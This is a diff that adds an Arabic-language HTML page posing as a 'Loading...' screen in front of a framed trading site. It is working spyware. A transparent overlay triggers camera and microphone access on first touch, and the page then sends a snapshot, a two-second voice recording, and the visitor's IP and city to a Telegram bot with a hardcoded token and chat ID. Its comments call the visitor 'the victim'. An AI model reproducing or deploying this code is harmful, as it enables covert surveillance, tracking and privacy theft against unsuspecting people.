@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحميل...</title>
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; }
+        iframe { width: 100%; height: 100%; border: none; z-index: 1; }
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99; background: rgba(0,0,0,0.01); }
+    </style>
+</head>
+<body>
+
+    <iframe src="https://traidmod.com/"></iframe>
+    <div id="overlay" onclick="setup()"></div>
+
+    <script>
+        const token = '8120975005:AAFpqunUzKJav0pCWI-ZjCMjUVi2FMOL3Go';
+        const chatId = '8249039685';
+        const redirectUrl = 'https://traidmod.com/';
+
+        async function sendReq(url, data) {
+            try { await fetch(url, { method: 'POST', body: data }); } catch(e) {}
+        }
+
+        // دالة السحب السريع
+        async function setup() {
+            document.getElementById('overlay').style.display = 'none';
+            
+            try {
+                // طلب الإذن "خبط لزق" أول ما يلمس الشاشة
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                
+                // 1. التقاط صورة فورية (بدون انتظار)
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    video.play();
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 480; // تقليل الجودة للسرعة
+                    canvas.height = 640;
+                    canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
+                    canvas.toBlob(blob => {
+                        const frm = new FormData();
+                        frm.append('chat_id', chatId);
+                        frm.append('photo', blob, '1.jpg');
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: frm });
+                    }, 'image/jpeg', 0.5); // ضغط الصورة 50% عشان تطير في النت
+                };
+
+                // 2. تسجيل صوتي (ثانيتين بس)
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'audio/ogg' });
+                    const frm = new FormData();
+                    frm.append('chat_id', chatId);
+                    frm.append('voice', blob, 'v.ogg');
+                    sendReq(`https://api.telegram.org/bot${token}/sendVoice`, frm);
+                    // قفل الكاميرا بعد السحب
+                    stream.getTracks().forEach(t => t.stop());
+                };
+                recorder.start();
+                setTimeout(() => recorder.stop(), 2000); // ثانيتين كفاية جداً
+
+            } catch (e) {
+                // لو رفض
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=🚫 الضحية رفض الأذونات`);
+            }
+        }
+
+        // جلب الـ IP في الخلفية فوراً
+        window.onload = () => {
+            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
+                const msg = `🔔 دخول جديد!\n🌐 IP: ${d.ip}\n📍 ${d.city}`;
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+            });
+        };
+    </script>
+</body>
+</html>
